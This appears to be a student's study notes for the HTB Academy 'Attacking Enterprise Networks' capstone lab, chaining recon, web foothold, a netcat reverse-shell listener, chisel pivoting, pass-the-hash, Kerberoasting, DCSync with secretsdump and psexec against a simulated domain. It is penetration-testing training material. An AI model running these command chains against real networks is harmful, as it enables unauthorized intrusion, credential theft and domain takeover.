# 28 — Attacking Enterprise Networks

> **Path Phase:** Capstone | **Difficulty:** Medium | **Sections:** 14

🏁 **The capstone.** A full simulated engagement against the Inlanefreight network — external recon to internal AD compromise to closeout, chaining every skill from the path.

> ℹ️ `{TARGET}` / `<YOUR_IP>` = target/attacker. Flags withheld per HTB Academy policy.

---

## 🏁 Full Attack Chain

External recon → web/service exploit → initial foothold →
local privesc → pivot into internal network →
lateral movement (credential reuse / PtH) →
BloodHound → Kerberoast/ACL → DCSync → Domain Admin →
loot + report


---

## Table of Contents
1. Intro to Attacking Enterprise Networks
2. Scenario & Kickoff
3. External Information Gathering
4. Service Enumeration & Exploitation
5. Web Enumeration & Exploitation
6. Initial Access
7. Post-Exploitation Persistence
8. Internal Information Gathering
9. Exploitation & Privilege Escalation
10. Lateral Movement
11. Active Directory Compromise
12. Post-Exploitation
13. Engagement Closeout
14. Beyond this Module

---

## 3 — External Information Gathering
```bash
whois inlanefreight.com
curl -s "https://crt.sh/?q=inlanefreight.com&output=json" | jq -r '.[].name_value' | sort -u
gobuster vhost -u http://{TARGET} -w <wordlist> --append-domain
```

## 4 — Service Enumeration & Exploitation
```bash
nmap -sV -sC -p- {TARGET} -oA full_scan
# Enumerate each service per the Footprinting playbook
```

## 5 — Web Enumeration & Exploitation
```bash
whatweb http://{TARGET}
ffuf -w <wordlist>:FUZZ -u http://{TARGET}/FUZZ -recursion -e .php
# Identify app → find vuln (SQLi/LFI/upload/CMS) → web shell
```
> **Web foothold:** ✅ Completed in lab (flag withheld per HTB Academy policy)

## 6 — Initial Access
```bash
nc -lvnp 443
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

## 7 — Post-Exploitation Persistence
Add SSH key/user, harvest local creds, ensure stable access before pivoting.

## 8 — Internal Information Gathering (Pivot)
```bash
ip a ; arp -a ; cat /etc/hosts
./chisel server -p 8080 --reverse            # attacker
./chisel client <YOUR_IP>:8080 R:socks        # foothold
proxychains nmap -sT -Pn <internal_subnet>
```

## 9 — Exploitation & Privilege Escalation
```bash
./linpeas.sh    # or  .\winPEASx64.exe
sudo -l ; find / -perm -4000 2>/dev/null
```
> **Privesc:** ✅ Completed in lab (flag withheld per HTB Academy policy)

## 10 — Lateral Movement
```bash
proxychains crackmapexec smb <internal_subnet> -u user -p pass
proxychains evil-winrm -i <internal_host> -u user -p pass
proxychains crackmapexec smb <host> -u Administrator -H <ntlm>   # Pass-the-Hash
```

## 11 — Active Directory Compromise ⭐
```bash
proxychains bloodhound-python -u user -p pass -d inlanefreight.local -ns <DC> -c all
proxychains GetUserSPNs.py inlanefreight.local/user:pass -dc-ip <DC> -request
hashcat -m 13100 kerb.hash rockyou.txt
proxychains secretsdump.py inlanefreight.local/user:pass@<DC> -just-dc
proxychains psexec.py inlanefreight.local/Administrator@<DC> -hashes :<ntlm>
```
> **Domain Admin:** ✅ Completed in lab (flag withheld per HTB Academy policy)

## 12–13 — Post-Exploitation & Closeout
Loot NTDS.dit, sensitive shares. Remove artifacts, restore changes, write the report (see Module 27) with every finding + evidence + remediation.

## 14 — Beyond this Module
This capstone mirrors the CPTS exam flow. Practice the full chain end-to-end without walkthroughs before the exam.

---

## 🧰 Tools Used
Every tool from the path — `nmap`, `ffuf`, `searchsploit`, `chisel`, `proxychains`, `linpeas`/`winPEAS`, `crackmapexec`, `bloodhound-python`, Impacket suite, `evil-winrm`, `hashcat`.

## 🔑 Key Takeaways
- This is **the CPTS exam in miniature** — internalize the full chain.
- Enumeration → foothold → privesc → pivot → AD → DA → report.
- Keep meticulous notes; the report is graded.
- Credential reuse is the glue connecting every stage.

---

*Part of my HTB CPTS Portfolio — Zeshan Ali*
